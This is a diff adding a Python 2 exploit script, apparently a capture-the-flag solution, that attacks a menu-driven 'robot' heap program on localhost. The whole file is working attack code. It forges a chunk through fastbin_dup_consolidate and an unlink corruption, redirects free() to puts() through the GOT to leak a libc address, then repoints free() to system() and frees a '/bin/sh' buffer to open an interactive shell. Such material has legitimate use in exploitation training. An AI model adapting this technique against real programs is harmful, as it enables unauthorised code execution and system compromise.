@@ -1,0 +1,140 @@
+#!/usr/bin/env python
+#  -*- coding: utf-8 -*-
+import telnetlib
+import struct
+from socket import *
+
+
+def p64(x): return struct.pack("<Q", x)
+
+
+def up64(x): return struct.unpack("<Q", x)[0]
+
+
+def init(ip, port):
+    s = socket(AF_INET, SOCK_STREAM)
+    s.connect((ip, port))
+    return s
+
+
+def interactive(s):
+    t = telnetlib.Telnet()
+    t.sock = s
+    t.interact()
+
+
+def recvuntil(s, ch):
+    data = ""
+    while ch not in data:
+        data += s.recv(1)
+    return data
+
+
+def recvline(s):
+    return recvuntil(s, '\n')
+
+
+def add(s, n, option=0):
+    recvuntil(s, "Your choice : ")
+    s.send("1\n")
+    recvuntil(s, "Your choice :")
+    s.send(str(n) + "\n")
+    if n == 2 or n == 3 or n == 6:
+        recvuntil(s, ": ")
+        s.send(str(option) + "\n")
+    print "[add] " + str(n) + " " + str(option)
+
+
+def delete(s, n):
+    recvuntil(s, "Your choice : ")
+    s.send("2\n")
+    recvuntil(s, "Your choice :")
+    s.send(str(n) + "\n")
+    print "[delete]" + str(n)
+
+
+def change(s, n, name):
+    recvuntil(s, "Your choice : ")
+    s.send("3\n")
+    recvuntil(s, "Your choice :")
+    s.send(str(n) + "\n")
+    recvuntil(s, "Robot's name: \n")
+    s.send(name)
+    print "[change] " + str(n)
+
+def manipulate_bit(s, b):
+    recvuntil(s, "Your choice : ")
+    s.send("1\n")
+    recvuntil(s, "Your choice :")
+    if b == 0:
+        b = "\x00"
+    else:
+        b = "\x01"
+    s.send("007" + "\x00" + b)
+
+s = init("localhost", 10003)
+
+
+add(s, 1) # user size : 0x14, chunk size : 0x20
+add(s, 2, 2)  # user size : 0x28, chunk size : 0x30
+add(s, 4) # user size : 0xfa0, chunk size : 0xfb0
+delete(s, 2)
+add(s, 6, 6760)  # user size > 0x21000 -> mmaped
+
+# replace the allocated bit of '2nd robot' as 1
+manipulate_bit(s, 1)
+delete(s, 2)  # fastbin_dup_consolidate
+
+add(s, 2, 2)
+
+p_global1 = 0x6030F8
+p_global2 = 0x6030F0
+p_global4 = 0x6031e0
+p_global6 = 0x6030e8
+
+fake_prev_size1 = 0x0
+fake_size = 0x20
+fake_fd = p_global2 - 0x18
+fake_bk = p_global2 - 0x10
+fake_prev_size2 = 0x20
+
+name = p64(fake_prev_size1) + p64(fake_size) + \
+       p64(fake_fd) + p64(fake_bk) + p64(fake_prev_size2)
+
+change(s, 2, name)
+delete(s, 4)  # unlink the fake chunk : global2 <- 0x6030d8
+
+# got & plt
+free_got = 0x603018
+puts_got = 0x603028
+puts_plt = 0x400830
+
+# ---- | robot4 | robot6 | robot2 | robot1 |
+
+name = p64(0) + p64(0) + p64(0) + p64(free_got) + p64(puts_got)
+change(s, 2, name)
+
+name = p64(puts_plt)
+change(s, 2, name)   # free() -> puts()
+delete(s, 1)  # puts_plt(puts_got)
+p_puts = recvline(s)[0:-1]
+p_puts = up64(p_puts +"\x00" * (8-len(p_puts)))
+print "p_puts : " + hex(p_puts)
+
+o_system = 0x45390
+o_puts = 0x6f690
+
+libcbase = p_puts - o_puts
+p_system = libcbase + o_system
+print "p_system : " + hex(p_system)
+
+manipulate_bit(s, 1)
+name = p64(p_system)
+change(s, 2, name)  # free() -> system()
+
+add(s, 3, 10)
+change(s, 3, "/bin/sh\x00")
+
+delete(s, 3)
+
+interactive(s)
